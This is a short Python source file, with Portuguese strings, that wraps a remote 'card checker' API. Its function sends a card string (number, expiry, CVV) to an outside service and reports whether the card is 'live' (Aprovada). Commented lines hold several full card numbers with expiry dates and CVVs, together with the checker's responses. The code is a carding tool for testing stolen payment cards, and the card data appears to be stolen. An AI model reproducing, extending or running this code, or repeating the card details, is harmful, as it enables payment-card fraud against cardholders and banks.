import requests


def corte(texto, inicio, final):
    
    if inicio in texto:
        if final in texto:
            texto = texto.split(inicio)[1].strip()
            texto = texto.split(final)[0].strip()
            return texto
        else:
            return 'final não encontrado'
    
    else:
        return 'inicio não encontrado'


def debito(cc):

    r = requests.get(f'https://thzinbotchecker.store/thzin/api.php?lista={cc}')

    if r.status_code == 200:
        if "Aprovada" in r.text:
            return {
            "status": True,
            "live": True,
            "message": "Aprovada #THZIN",
        }

        if "Gate Caiu" in r.text or "Aguarde uns minutos" in r.text:
                    return {
                    "status": False,
                    "live": False,
                    "message": "Gate caiu",
                }

        else:
            return {
                    "status": True,
                    "live": False,
                    "message": corte(r.text, "<span class='text-danger'>", "</span>").strip()
                }


    else:
        return {
            "status": False,
            "live": False,
            "message": "Erro ao se conectar com o checker",
        }



#print(pre_auth('4854648134528608|04|2026|341'))


#<span class='text-danger'> Cartão não identificado </span></br>

#<font color='red'>Reprovada</font> &nbsp&nbsp 4350870052234147|07|2025|557 | Retorno: <span class='text-danger'> Gate Caiu!, Aguarde alguns minutos. </span>| Tempo de Resposta: 2s | #Thzin Checkers <br>

#<font color='red'>Reprovada</font> &nbsp&nbsp 4854648134528608|04|2026|341 | Retorno: <span class='text-danger'>Transação Recusada </span>| Tempo de Resposta: 3s | #Thzin Checkers  <br>

#<font color='red'>Reprovada</font> &nbsp&nbsp 5276600066645378|12|2024|370 | Retorno: <span class='text-danger'> Aguarde uns minutos, Muitas Request. </span>| Tempo de Resposta: 1s | #Thzin Checkers <br